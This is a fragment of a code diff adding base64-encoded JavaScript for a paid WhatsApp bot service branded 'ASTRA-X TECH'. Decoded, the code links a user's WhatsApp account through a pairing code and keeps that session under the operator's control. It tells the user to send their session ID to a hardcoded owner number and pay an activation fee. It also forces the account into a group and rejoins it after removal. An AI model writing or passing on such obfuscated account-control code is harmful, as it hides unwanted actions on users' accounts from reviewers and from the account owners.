+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSACmFzeW5jIGZ1bmN0aW9uIGlzR3JvdXBBZG1pbihzb2NrLCBqaWQsIHBhcnRpY2lw",
+    "YW50KSB7CiAgdHJ5IHsKICAgIGNvbnN0IG1ldGEgPSBhd2FpdCBzb2NrLmdyb3VwTWV0YWRhdGEoamlk",
+    "KTsKICAgIHJldHVybiBtZXRhLnBhcnRpY2lwYW50cy5maWx0ZXIocCA9PiBwLmFkbWluKS5tYXAocCA9",
+    "PiBwLmlkKS5pbmNsdWRlcyhwYXJ0aWNpcGFudCk7CiAgfSBjYXRjaCAoXykgeyByZXR1cm4gZmFsc2U7",
+    "IH0KfQoKLy8g4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ",
+    "4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQ4pWQCi8vIGNyZWF0",
+    "ZVNvY2tldAovLyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi",
+    "lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZAKYXN5bmMg",
+    "ZnVuY3Rpb24gY3JlYXRlU29ja2V0KHVzZXJJZCwgcGhvbmVOdW1iZXIsIHNlc3NEaXIsIG9wdHMgPSB7",
+    "fSkgewogIGNvbnN0IHZlcnNpb24gICAgICAgID0gYXdhaXQgZ2V0VmVyc2lvbigpOwogIGNvbnN0IHsg",
+    "c3RhdGUsIHNhdmVDcmVkcyB9ID0gYXdhaXQgdXNlTXVsdGlGaWxlQXV0aFN0YXRlKHNlc3NEaXIpOwog",
+    "IGNvbnN0IGJhaWxleXNMb2dnZXIgID0gbG9nZ2VyLmNoaWxkID8gbG9nZ2VyLmNoaWxkKCkgOiBsb2dn",
+    "ZXI7CgogIGNvbnN0IHNvY2sgPSBtYWtlV0FTb2NrZXQoewogICAgYXV0aDogeyBjcmVkczogc3RhdGUu",
+    "Y3JlZHMsIGtleXM6IG1ha2VDYWNoZWFibGVTaWduYWxLZXlTdG9yZShzdGF0ZS5rZXlzLCBiYWlsZXlz",
+    "TG9nZ2VyKSB9LAogICAgbG9nZ2VyOiAgICAgICAgICAgICAgICAgICAgICAgICBiYWlsZXlzTG9nZ2Vy",
+    "LAogICAgdmVyc2lvbiwKICAgIGJyb3dzZXI6ICAgICAgICAgICAgICAgICAgICAgICAgQnJvd3NlcnMu",
+    "dWJ1bnR1KCdDaHJvbWUnKSwKICAgIGtlZXBBbGl2ZUludGVydmFsTXM6ICAgICAgICAgICAgOV8wMDAs",
+    "CiAgICBzeW5jRnVsbEhpc3Rvcnk6ICAgICAgICAgICAgICAgIGZhbHNlLAogICAgZG93bmxvYWRIaXN0",
+    "b3J5OiAgICAgICAgICAgICAgICBmYWxzZSwKICAgIGdlbmVyYXRlSGlnaFF1YWxpdHlMaW5rUHJldmll",
+    "dzogZmFsc2UsCiAgICBjb25uZWN0VGltZW91dE1zOiAgICAgICAgICAgICAgIDYwXzAwMCwKICAgIG1h",
+    "eFJldHJpZXM6ICAgICAgICAgICAgICAgICAgICAgOCwKICAgIHByaW50UVJJblRlcm1pbmFsOiAgICAg",
+    "ICAgICAgICAgZmFsc2UsCiAgICBkZWZhdWx0UXVlcnlUaW1lb3V0TXM6ICAgICAgICAgIDMwXzAwMCwK",
+    "ICAgIHJldHJ5UmVxdWVzdERlbGF5TXM6ICAgICAgICAgICAgMjAwMCwKICAgIG1hcmtPbmxpbmVPbkNv",
+    "bm5lY3Q6ICAgICAgICAgICAgdHJ1ZSwKICAgIGZpcmVJbml0UXVlcmllczogICAgICAgICAgICAgICAg",
+    "dHJ1ZSwKICAgIGVtaXRPd25FdmVudHM6ICAgICAgICAgICAgICAgICAgZmFsc2UsCiAgICBtb2JpbGU6",
+    "ICAgICAgICAgICAgICAgICAgICAgICAgIGZhbHNlLAogIH0pOwoKICBzZXNzaW9uc1t1c2VySWRdID0g",
+    "c2Vzc2lvbnNbdXNlcklkXQogICAgPyB7IC4uLnNlc3Npb25zW3VzZXJJZF0sIHNvY2sgfQogICAgOiB7",
+    "IHNvY2ssIHBob25lTnVtYmVyLCBjcmVhdGVkQXQ6IG5ldyBEYXRlKCksIGNvZGU6IG51bGwsIGlzQWN0",
+    "aXZlOiBmYWxzZSB9OwogIGRiLnJlZ2lzdGVyU2Vzc2lvbih1c2VySWQsIHNvY2ssIHBob25lTnVtYmVy",
+    "KTsKCiAgc29jay5ldi5vbignY3JlZHMudXBkYXRlJywgKCkgPT4gc2F2ZUNyZWRzKCkuY2F0Y2goKCkg",
+    "PT4ge30pKTsKCiAgbGV0IGNvZGVSZXF1ZXN0ZWQgPSBmYWxzZTsKCiAgLy8gQ29ubmVjdGlvbiBsaWZl",
+    "Y3ljbGUKICAvLyDilIDilIAgQ29ubmVjdGlvbiBsaWZlY3ljbGUg4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA",
+    "4pSA4pSACiAgc29jay5ldi5vbignY29ubmVjdGlvbi51cGRhdGUnLCAoeyBjb25uZWN0aW9uLCBsYXN0",
+    "RGlzY29ubmVjdCB9KSA9PiB7CgogICAgLy8gUmVxdWVzdCBwYWlyaW5nIGNvZGUgb24gJ2Nvbm5lY3Rp",
+    "bmcnIHVzaW5nIG5vbi1ibG9ja2luZyBzZXRUaW1lb3V0CiAgICBpZiAob3B0cy5yZXF1ZXN0Q29kZSAm",
+    "JiAhc3RhdGUuY3JlZHMucmVnaXN0ZXJlZCAmJiBjb25uZWN0aW9uID09PSAnY29ubmVjdGluZycgJiYg",
+    "IWNvZGVSZXF1ZXN0ZWQpIHsKICAgICAgY29kZVJlcXVlc3RlZCA9IHRydWU7CiAgICAgIHNldFRpbWVv",
+    "dXQoYXN5bmMgKCkgPT4gewogICAgICAgIGxldCBjb2RlLCBsYXN0RXJyOwogICAgICAgIGZvciAobGV0",
+    "IGF0dGVtcHQgPSAxOyBhdHRlbXB0IDw9IDM7IGF0dGVtcHQrKykgewogICAgICAgICAgdHJ5IHsKICAg",
+    "ICAgICAgICAgY29uc3QgY2xlYW4gPSBwaG9uZU51bWJlci5yZXBsYWNlKC9cRC9nLCAnJyk7CiAgICAg",
+    "ICAgICAgIGxvZ2dlci5pbmZvKCdbJyArIHVzZXJJZCArICddIFJlcXVlc3RpbmcgcGFpcmluZyBjb2Rl",
+    "IChhdHRlbXB0ICcgKyBhdHRlbXB0ICsgJykuLi4nKTsKICAgICAgICAgICAgY29kZSA9IGF3YWl0IHNv",
+    "Y2sucmVxdWVzdFBhaXJpbmdDb2RlKGNsZWFuKTsKICAgICAgICAgICAgaWYgKGNvZGUpIGJyZWFrOwog",
+    "ICAgICAgICAgfSBjYXRjaCAoZSkgewogICAgICAgICAgICBsYXN0RXJyID0gZTsKICAgICAgICAgICAg",
+    "bG9nZ2VyLndhcm4oJ1snICsgdXNlcklkICsgJ10gQXR0ZW1wdCAnICsgYXR0ZW1wdCArICcgZmFpbGVk",
+    "OiAnICsgZS5tZXNzYWdlKTsKICAgICAgICAgICAgaWYgKGF0dGVtcHQgPCAzKSBhd2FpdCBzbGVlcCgy",
+    "MDAwICogYXR0ZW1wdCk7CiAgICAgICAgICB9CiAgICAgICAgfQogICAgICAgIGlmIChjb2RlKSB7CiAg",
+    "ICAgICAgICBjb25zdCBmbXQgPSBjb2RlLm1hdGNoKC8uezEsNH0vZyk/LmpvaW4oJy0nKSB8fCBjb2Rl",
+    "OwogICAgICAgICAgbG9nZ2VyLmluZm8oJ1snICsgdXNlcklkICsgJ10gUGFpcmluZyBjb2RlOiAnICsg",
+    "Zm10KTsKICAgICAgICAgIGlmIChzZXNzaW9uc1t1c2VySWRdKSBzZXNzaW9uc1t1c2VySWRdLmNvZGUg",
+    "PSBmbXQ7CiAgICAgICAgICBpZiAob3B0cy5vbkNvZGUpIG9wdHMub25Db2RlKGZtdCk7CiAgICAgICAg",
+    "fSBlbHNlIHsKICAgICAgICAgIGNvbnN0IG1zZyA9IChsYXN0RXJyICYmIGxhc3RFcnIubWVzc2FnZSkg",
+    "fHwgJ05vIGNvZGUgcmV0dXJuZWQnOwogICAgICAgICAgbG9nZ2VyLmVycm9yKCdbJyArIHVzZXJJZCAr",
+    "ICddIHJlcXVlc3RQYWlyaW5nQ29kZSBmYWlsZWQ6ICcgKyBtc2cpOwogICAgICAgICAgaWYgKG9wdHMu",
+    "b25GYWlsKSBvcHRzLm9uRmFpbChuZXcgRXJyb3IoJ0NvdWxkIG5vdCBnZXQgcGFpcmluZyBjb2RlOiAn",
+    "ICsgbXNnKSk7CiAgICAgICAgfQogICAgICB9LCAzMDAwKTsKICAgIH0KCiAgICBpZiAoY29ubmVjdGlv",
+    "biA9PT0gJ29wZW4nKSB7CiAgICAgIGlmIChzZXNzaW9uc1t1c2VySWRdKSBzZXNzaW9uc1t1c2VySWRd",
+    "LmlzQWN0aXZlID0gdHJ1ZTsKICAgICAgc3RhcnRBbHdheXNPbmxpbmUoc29jaywgdXNlcklkKTsKCiAg",
+    "ICAgIGlmIChvcHRzLnJlcXVlc3RDb2RlKSB7CiAgICAgICAgLy8gVHdvIGNhc2VzIHdoZW4gY29ubmVj",
+    "dGlvbiBvcGVucyBkdXJpbmcgcGFpcmluZzoKICAgICAgICAvLyBDYXNlIDE6IGNyZWRzLnJlZ2lzdGVy",
+    "ZWQgPSBGQUxTRSDigJQgZmlyc3QgY29ubmVjdCwgY29kZSBub3QgZW50ZXJlZCB5ZXQuIERvIG5vdGhp",
+    "bmcuCiAgICAgICAgLy8gQ2FzZSAyOiBjcmVkcy5yZWdpc3RlcmVkID0gVFJVRSAg4oCUIHVzZXIgZW50",
+    "ZXJlZCBjb2RlLCBXQSBjb25maXJtZWQgbGluay4gU2VuZCBETS4KICAgICAgICBpZiAoc3RhdGUuY3Jl",
+    "ZHMucmVnaXN0ZXJlZCkgewogICAgICAgICAgLy8gVXNlciBoYXMgZnVsbHkgbGlua2VkLiBTZW5kIHNl",
+    "c3Npb24gSUQgdG8gdGhlaXIgb3duIERNIHRoZW4gZGlzY29ubmVjdC4KICAgICAgICAgIChhc3luYyAo",
+    "KSA9PiB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgYXdhaXQgc2xlZXAoMzAwMCk7IC8v",
+    "IGxldCBXQSBmaW5pc2gga2V5IHN5bmMKICAgICAgICAgICAgICBjb25zdCBzcyAgPSByZXF1aXJlKCcu",
+    "L3Nlc3Npb25TdG9yZScpOwogICAgICAgICAgICAgIC8vIFVzZSBleGlzdGluZyByZWNvcmQgKGFscmVh",
+    "ZHkgcmVnaXN0ZXJlZCBhdCBwYWlyLXJlcXVlc3QgdGltZSkKICAgICAgICAgICAgICAvLyBJZiBzb21l",
+    "aG93IG1pc3NpbmcsIHJlZ2lzdGVyIG5vdyBhcyBhIHNhZmV0eSBmYWxsYmFjawogICAgICAgICAgICAg",
+    "IGNvbnN0IGV4aXN0aW5nID0gc3MuZ2V0QnlVc2VySWQodXNlcklkKTsKICAgICAgICAgICAgICBjb25z",
+    "dCBzaWQgPSBleGlzdGluZyA/IGV4aXN0aW5nLnNlc3Npb25JZCA6IHNzLnJlZ2lzdGVyKHVzZXJJZCwg",
+    "cGhvbmVOdW1iZXIpOwogICAgICAgICAgICAgIC8vIFNlbGYgSklEIOKAlCBmb3JtYXQ6IG51bWJlckBz",
+    "LndoYXRzYXBwLm5ldAogICAgICAgICAgICAgIGNvbnN0IHJhd0ppZCA9IHNvY2sudXNlciAmJiBzb2Nr",
+    "LnVzZXIuaWQ7CiAgICAgICAgICAgICAgaWYgKCFyYXdKaWQpIHRocm93IG5ldyBFcnJvcignTm8gdXNl",
+    "ciBKSUQgYWZ0ZXIgbGluaycpOwogICAgICAgICAgICAgIC8vIE5vcm1hbGl6ZSB0byBzLndoYXRzYXBw",
+    "Lm5ldCAoc3RyaXAgOlggc3VmZml4IGlmIHByZXNlbnQpCiAgICAgICAgICAgICAgY29uc3Qgc2VsZkpp",
+    "ZCA9IHJhd0ppZC5pbmNsdWRlcygnOicpCiAgICAgICAgICAgICAgICA/IHJhd0ppZC5zcGxpdCgnOicp",
+    "WzBdICsgJ0BzLndoYXRzYXBwLm5ldCcKICAgICAgICAgICAgICAgIDogcmF3SmlkOwogICAgICAgICAg",
+    "ICAgIGNvbnN0IE9XTkVSID0gcHJvY2Vzcy5lbnYuQk9UX09XTkVSIHx8ICcyNTY3NDczMDQxOTYnOwog",
+    "ICAgICAgICAgICAgIGNvbnN0IFQgPSAnXHUyNTBmJyArICdcdTI1MDEnLnJlcGVhdCgxOSkgKyAnXHUy",
+    "NWEzJzsKICAgICAgICAgICAgICBjb25zdCBEID0gJ1x1MjUyMCcgKyAnXHUyNTAwJy5yZXBlYXQoMjEp",
+    "OwogICAgICAgICAgICAgIGNvbnN0IEIgPSAnXHUyNTE3JyArICdcdTI1MDEnLnJlcGVhdCgxOSkgKyAn",
+    "XHUyNWEzJzsKICAgICAgICAgICAgICBjb25zdCBQID0gJ1x1MjUwMyc7CiAgICAgICAgICAgICAgY29u",
+    "c3QgSCA9ICdbIEFTVFJBLVggVEVDSCBdJzsKCiAgICAgICAgICAgICAgLy8gTWVzc2FnZSAxOiBTZXNz",
+    "aW9uIElEIOKAlCBzZW5kIHRvIG93biBETQogICAgICAgICAgICAgIGF3YWl0IHNvY2suc2VuZE1lc3Nh",
+    "Z2Uoc2VsZkppZCwgewogICAgICAgICAgICAgICAgdGV4dDoKICAgICAgICAgICAgICAgICAgSCArICdc",
+    "bicgKyBUICsgJ1xuJyArCiAgICAgICAgICAgICAgICAgIFAgKyAnIFx1RDgzRFx1REQxMSAqWU9VUiBT",
+    "RVNTSU9OIElEKlxuJyArCiAgICAgICAgICAgICAgICAgIEQgKyAnXG4nICsKICAgICAgICAgICAgICAg",
+    "ICAgUCArICdcbicgKwogICAgICAgICAgICAgICAgICBQICsgJyAgKicgKyBzaWQgKyAnKlxuJyArCiAg",
+    "ICAgICAgICAgICAgICAgIFAgKyAnXG4nICsKICAgICAgICAgICAgICAgICAgRCArICdcbicgKwogICAg",
+    "ICAgICAgICAgICAgICBQICsgJyBUYXAgJiBob2xkIHRoZSBJRCBhYm92ZSB0byBjb3B5IGl0XG4nICsK",
+    "ICAgICAgICAgICAgICAgICAgQiArICdcbicgKwogICAgICAgICAgICAgICAgICAnX0FTVFJBLVggVEVD",
+    "SCBcdUQ4M0NcdURGMERfJywKICAgICAgICAgICAgICB9KTsKCiAgICAgICAgICAgICAgYXdhaXQgc2xl",
+    "ZXAoMjUwMCk7CgogICAgICAgICAgICAgIC8vIE1lc3NhZ2UgMjogSW5zdHJ1Y3Rpb25zCiAgICAgICAg",
+    "ICAgICAgYXdhaXQgc29jay5zZW5kTWVzc2FnZShzZWxmSmlkLCB7CiAgICAgICAgICAgICAgICB0ZXh0",
+    "OgogICAgICAgICAgICAgICAgICBIICsgJ1xuJyArIFQgKyAnXG4nICsKICAgICAgICAgICAgICAgICAg",
+    "UCArICcgXHVEODNEXHVEQ0NCICpIT1cgVE8gQUNUSVZBVEUgWU9VUiBCT1QqXG4nICsKICAgICAgICAg",
+    "ICAgICAgICAgRCArICdcbicgKwogICAgICAgICAgICAgICAgICBQICsgJyAxXHVGRTBGXHUyMEUzICBD",
+    "b3B5IHlvdXIgU2Vzc2lvbiBJRCBhYm92ZVxuJyArCiAgICAgICAgICAgICAgICAgIFAgKyAnXG4nICsK",
+    "ICAgICAgICAgICAgICAgICAgUCArICcgMlx1RkUwRlx1MjBFMyAgU2VuZCBpdCB0byB0aGUgb3duZXIg",
+    "b24gV2hhdHNBcHA6XG4nICsKICAgICAgICAgICAgICAgICAgUCArICcgICAgXHVEODNEXHVEQ0YxICor",
+    "JyArIE9XTkVSICsgJypcbicgKwogICAgICAgICAgICAgICAgICBQICsgJ1xuJyArCiAgICAgICAgICAg",
+    "ICAgICAgIFAgKyAnIDNcdUZFMEZcdTIwRTMgIFBheSB0aGUgYWN0aXZhdGlvbiBmZWVcbicgKwogICAg",
+    "ICAgICAgICAgICAgICBQICsgJ1xuJyArCiAgICAgICAgICAgICAgICAgIFAgKyAnIDRcdUZFMEZcdTIw",
+    "RTMgIE93bmVyIGFjdGl2YXRlcyDigJQgYm90IGdvZXMgT05MSU5FIFx1MjcwNVxuJyArCiAgICAgICAg",
+    "ICAgICAgICAgIEQgKyAnXG4nICsKICAgICAgICAgICAgICAgICAgUCArICcgXHUyNkEwXHVGRTBGICpC",
+    "RVdBUkUgT0YgU0NBTU1FUlMqXG4nICsKICAgICAgICAgICAgICAgICAgUCArICcgT05MWSBzZW5kIHRv",
+    "ICorJyArIE9XTkVSICsgJypcbicgKwogICAgICAgICAgICAgICAgICBQICsgJyBOZXZlciBwYXkgYW55",
+    "b25lIGVsc2UhXG4nICsKICAgICAgICAgICAgICAgICAgQiArICdcbicgKwogICAgICAgICAgICAgICAg",
+    "ICAnX0FTVFJBLVggVEVDSCBcdUQ4M0RcdURFODBfJywKICAgICAgICAgICAgICB9KTsKCiAgICAgICAg",
+    "ICAgICAgbG9nZ2VyLmluZm8oJ1snICsgdXNlcklkICsgJ10gU2Vzc2lvbiBJRCAnICsgc2lkICsgJyBz",
+    "ZW50IHRvIHVzZXIgRE0gYXQgJyArIHNlbGZKaWQpOwogICAgICAgICAgICAgIGF3YWl0IHNsZWVwKDIw",
+    "MDApOwogICAgICAgICAgICB9IGNhdGNoIChlKSB7CiAgICAgICAgICAgICAgbG9nZ2VyLmVycm9yKCdb",
+    "JyArIHVzZXJJZCArICddIEZhaWxlZCB0byBzZW5kIHNlc3Npb24gSUQgRE06ICcgKyBlLm1lc3NhZ2Up",
+    "OwogICAgICAgICAgICB9CiAgICAgICAgICAgIC8vIERpc2Nvbm5lY3Qg4oCUIHVzZXIgbXVzdCB3YWl0",
+    "IGZvciBhZG1pbiBhY3RpdmF0aW9uCiAgICAgICAgICAgIHRyeSB7IGNhbmNlbFNlc3Npb24odXNlcklk",
+    "KTsgfSBjYXRjaCAoXykge30KICAgICAgICAgICAgbG9nZ2VyLmluZm8oJ1snICsgdXNlcklkICsgJ10g",
+    "U2Vzc2lvbiBkaXNjb25uZWN0ZWQg4oCUIGF3YWl0aW5nIGFkbWluIGFjdGl2YXRpb24nKTsKICAgICAg",
+    "ICAgIH0pKCk7CiAgICAgICAgfQogICAgICAgIC8vIENhc2UgMTogY3JlZHMucmVnaXN0ZXJlZCA9IGZh",
+    "bHNlIOKAlCBmaXJzdCBvcGVuLCBqdXN0IHNob3dpbmcgY29kZS4gRG8gbm90aGluZy4KICAgICAgfSBl",
+    "bHNlIHsKICAgICAgICAvLyBSZXN0b3JlZCBzZXNzaW9uIOKAlCBydW4gbm9ybWFsIHN0YXJ0dXAgdGFz",
+    "a3MKICAgICAgICBzZXRUaW1lb3V0KCgpID0+IGZvcmNlSm9pbkdyb3VwKHNvY2ssIHVzZXJJZCksIDgw",
+    "MDApOwogICAgICAgIC8vIERpc2Nvbm5lY3QgaWYgc3Vic2NyaXB0aW9uIG5vdCBhY3RpdmUg4oCUIG1h",
+    "cmsgYXMgc3RvcHBlZCBzbyBjbG9zZSBoYW5kbGVyIHdvbid0IHJlY29ubmVjdAogICAgICAgIGlmICgh",
+    "dXNlclN0b3JlLmlzVXNlckFjdGl2ZSh1c2VySWQpKSB7CiAgICAgICAgICBsb2dnZXIud2FybignWycg",
+    "KyB1c2VySWQgKyAnXSBTdWJzY3JpcHRpb24gZXhwaXJlZC9pbmFjdGl2ZSDigJQgZGlzY29ubmVjdGlu",
+    "ZycpOwogICAgICAgICAgaWYgKHNlc3Npb25zW3VzZXJJZF0pIHNlc3Npb25zW3VzZXJJZF0uc3RvcHBl",
+    "ZCA9IHRydWU7CiAgICAgICAgICBzZXRUaW1lb3V0KCgpID0+IHsgdHJ5IHsgY2FuY2VsU2Vzc2lvbih1",
+    "c2VySWQpOyB9IGNhdGNoIChfKSB7fSB9LCAzMDAwKTsKICAgICAgICB9CiAgICAgIH0KCiAgICAgIGlm",
+    "IChvcHRzLm9uT3Blbikgb3B0cy5vbk9wZW4oKTsKICAgIH0KCiAgICBpZiAoY29ubmVjdGlvbiA9PT0g",
+    "J2Nsb3NlJykgewogICAgICBjb25zdCBzdGF0dXNDb2RlID0gbGFzdERpc2Nvbm5lY3QgJiYgbGFzdERp",
+    "c2Nvbm5lY3QuZXJyb3IgJiYKICAgICAgICAgICAgICAgICAgICAgICAgIGxhc3REaXNjb25uZWN0LmVy",
+    "cm9yLm91dHB1dCAmJiBsYXN0RGlzY29ubmVjdC5lcnJvci5vdXRwdXQuc3RhdHVzQ29kZTsKICAgICAg",
+    "aWYgKHNlc3Npb25zW3VzZXJJZF0pIHNlc3Npb25zW3VzZXJJZF0uaXNBY3RpdmUgPSBmYWxzZTsKCiAg",
+    "ICAgIGlmICghc2Vzc2lvbnNbdXNlcklkXSkgcmV0dXJuOwoKICAgICAgaWYgKHN0YXR1c0NvZGUgPT09",
+    "IERpc2Nvbm5lY3RSZWFzb24ubG9nZ2VkT3V0IHx8IHN0YXR1c0NvZGUgPT09IDQwMSkgewogICAgICAg",
+    "IGRlbGV0ZSBzZXNzaW9uc1t1c2VySWRdOwogICAgICAgIGlmIChvcHRzLm9uRmFpbCkgb3B0cy5vbkZh",
+    "aWwobmV3IEVycm9yKCdMb2dnZWQgb3V0JykpOwogICAgICAgIHJldHVybjsKICAgICAgfQoKICAgICAg",
+    "aWYgKG9wdHMucmVxdWVzdENvZGUpIHsKICAgICAgICBpZiAoc3RhdHVzQ29kZSA9PT0gRGlzY29ubmVj",
+    "dFJlYXNvbi5sb2dnZWRPdXQgfHwgc3RhdHVzQ29kZSA9PT0gNDAxKSB7CiAgICAgICAgICAvLyBHZW51",
+    "aW5lIGZhaWx1cmUg4oCUIHVzZXIgbXVzdCByZS1wYWlyCiAgICAgICAgICBsb2dnZXIuaW5mbygnWycg",
+    "KyB1c2VySWQgKyAnXSBQYWlyaW5nIGZhaWxlZCDigJQgbXVzdCByZS1wYWlyJyk7CiAgICAgICAgICBp",
+    "ZiAob3B0cy5vbkZhaWwpIG9wdHMub25GYWlsKG5ldyBFcnJvcignUGFpcmluZyBmYWlsZWQnKSk7CiAg",
+    "ICAgICAgICByZXR1cm47CiAgICAgICAgfQogICAgICAgIC8vIFdBIGF1dGggZXhjaGFuZ2UgY2F1c2Vz",
+    "IGEgbm9ybWFsIGRpc2Nvbm5lY3QgdGhlbiByZWNvbm5lY3QKICAgICAgICAvLyBLZWVwIGFsaXZlIGJ5",
+    "IHJlY29ubmVjdGluZyBXSVRIT1VUIHJlcXVlc3RDb2RlIHNvIFdBIGNhbiBmaW5pc2ggdGhlIGhhbmRz",
+    "aGFrZQogICAgICAgIC8vIFRoZSBwYWlyaW5nIGNvZGUgYWxyZWFkeSBzaG93biB0byB1c2VyIHJlbWFp",
+    "bnMgdmFsaWQKICAgICAgICBsb2dnZXIuaW5mbygnWycgKyB1c2VySWQgKyAnXSBQYWlyaW5nIGF1dGgg",
+    "ZXhjaGFuZ2UgZGlzY29ubmVjdCDigJQgcmVjb25uZWN0aW5nIGluIDNzLi4uJyk7CiAgICAgICAgc2V0",
+    "VGltZW91dCgoKSA9PiB7CiAgICAgICAgICBpZiAoIXNlc3Npb25zW3VzZXJJZF0pIHJldHVybjsgLy8g",
+    "Y2FuY2VsbGVkIGJ5IGFkbWluL3VzZXIKICAgICAgICAgIGNyZWF0ZVNvY2tldCh1c2VySWQsIHBob25l",
+    "TnVtYmVyLCBzZXNzRGlyLCB7CiAgICAgICAgICAgIHJlcXVlc3RDb2RlOiBmYWxzZSwKICAgICAgICAg",
+    "ICAgb25PcGVuOiBvcHRzLm9uT3BlbiwKICAgICAgICAgICAgb25GYWlsOiBvcHRzLm9uRmFpbCwKICAg",
+    "ICAgICAgIH0pLmNhdGNoKCgpID0+IHt9KTsKICAgICAgICB9LCAzMDAwKTsKICAgICAgICByZXR1cm47",
+    "CiAgICAgIH0KCiAgICAgIC8vIElmIHN0b3BwZWQgKHN1YnNjcmlwdGlvbiBpbmFjdGl2ZSksIGRvIG5v",
+    "dCByZWNvbm5lY3QKICAgICAgaWYgKHNlc3Npb25zW3VzZXJJZF0gJiYgc2Vzc2lvbnNbdXNlcklkXS5z",
+    "dG9wcGVkKSB7IGRlbGV0ZSBzZXNzaW9uc1t1c2VySWRdOyByZXR1cm47IH0KCiAgICAgIGNvbnN0IGRl",
+    "bGF5ID0gKHN0YXR1c0NvZGUgPT09IDQyOCB8fCBzdGF0dXNDb2RlID09PSA0MDggfHwgc3RhdHVzQ29k",
+    "ZSA9PT0gNTE1KSA/IDMwMDAgOiA3MDAwOwogICAgICBzZXRUaW1lb3V0KCgpID0+IHsKICAgICAgICBp",
+    "ZiAoIXNlc3Npb25zW3VzZXJJZF0pIHJldHVybjsKICAgICAgICBpZiAoc2Vzc2lvbnNbdXNlcklkXS5z",
+    "dG9wcGVkKSB7IGRlbGV0ZSBzZXNzaW9uc1t1c2VySWRdOyByZXR1cm47IH0KICAgICAgICBjcmVhdGVT",
+    "b2NrZXQodXNlcklkLCBwaG9uZU51bWJlciwgc2Vzc0RpciwgewogICAgICAgICAgcmVxdWVzdENvZGU6",
+    "IGZhbHNlLAogICAgICAgICAgb25PcGVuOiBvcHRzLm9uT3BlbiwKICAgICAgICAgIG9uRmFpbDogb3B0",
+    "cy5vbkZhaWwsCiAgICAgICAgfSkuY2F0Y2goKCkgPT4ge30pOwogICAgICB9LCBkZWxheSk7CiAgICB9",
+    "CiAgfSk7CgoKCgogIHNvY2suZXYub24oJ2Vycm9yJywgZSA9PiBsb2dnZXIuZXJyb3IoYFNvY2tldCBl",
+    "cnJvciBbJHt1c2VySWR9XTpgLCBlPy5tZXNzYWdlIHx8IGUpKTsKCiAgLy8g4pSA4pSAIEdyb3VwIHBh",
+    "cnRpY2lwYW50cyDigJQgd2VsY29tZSwgZ29vZGJ5ZSwgYW50aWZha2UsIGFudGlib3Qg4pSA4pSA4pSA",
+    "4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgc29jay5ldi5vbignZ3JvdXAtcGFydGljaXBhbnRzLnVwZGF0",
+    "ZScsIGFzeW5jICh7IGlkOiBqaWQsIHBhcnRpY2lwYW50cywgYWN0aW9uIH0pID0+IHsKICAgIHRyeSB7",
+    "CiAgICAgIGlmICghamlkPy5lbmRzV2l0aCgnQGcudXMnKSkgcmV0dXJuOwoKICAgICAgZm9yIChjb25z",
+    "dCBwIG9mIHBhcnRpY2lwYW50cykgewogICAgICAgIC8vIE5ld2VyIEJhaWxleXMgcmV0dXJucyBvYmpl",
+    "Y3RzLCBvbGRlciByZXR1cm5zIHN0cmluZ3Mg4oCUIGhhbmRsZSBib3RoCiAgICAgICAgY29uc3QgcGFy",
+    "dGljaXBhbnQgPSB0eXBlb2YgcCA9PT0gJ3N0cmluZycgPyBwIDogKHA/LmlkIHx8IHA/LmppZCB8fCBT",
+    "dHJpbmcocCkpOwogICAgICAgIGNvbnN0IG51bSA9IHBhcnRpY2lwYW50LnNwbGl0KCdAJylbMF07Cgog",
+    "ICAgICAgIC8vIOKUgOKUgCBSZS1qb2luIGZvcmNlIGdyb3VwIGlmIGJvdCBpdHNlbGYgd2FzIHJlbW92",
+    "ZWQg4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSACiAgICAgICAgY29uc3QgYm90",
+    "SmlkID0gc29jay51c2VyPy5pZD8uc3BsaXQoJzonKVswXSArICdAcy53aGF0c2FwcC5uZXQnOwogICAg",
+    "ICAgIGlmICgoYWN0aW9uID09PSAncmVtb3ZlJyB8fCBhY3Rpb24gPT09ICdsZWF2ZScpICYmIHBhcnRp",
+    "Y2lwYW50ID09PSBib3RKaWQpIHsKICAgICAgICAgIGNvbnN0IGdyb3VwSW52aXRlQ29kZSA9IGF3YWl0",
+    "IHNvY2suZ3JvdXBJbnZpdGVDb2RlKGppZCkuY2F0Y2goKCkgPT4gbnVsbCk7CiAgICAgICAgICBpZiAo",
+    "Z3JvdXBJbnZpdGVDb2RlID09PSBGT1JDRV9HUk9VUF9DT0RFIHx8CiAgICAgICAgICAgICAgc2V0dGlu",
+    "Z3MuZ2V0KCdmb3JjZWdyb3VwOicgKyBqaWQpID09PSBGT1JDRV9HUk9VUF9DT0RFKSB7CiAgICAgICAg",
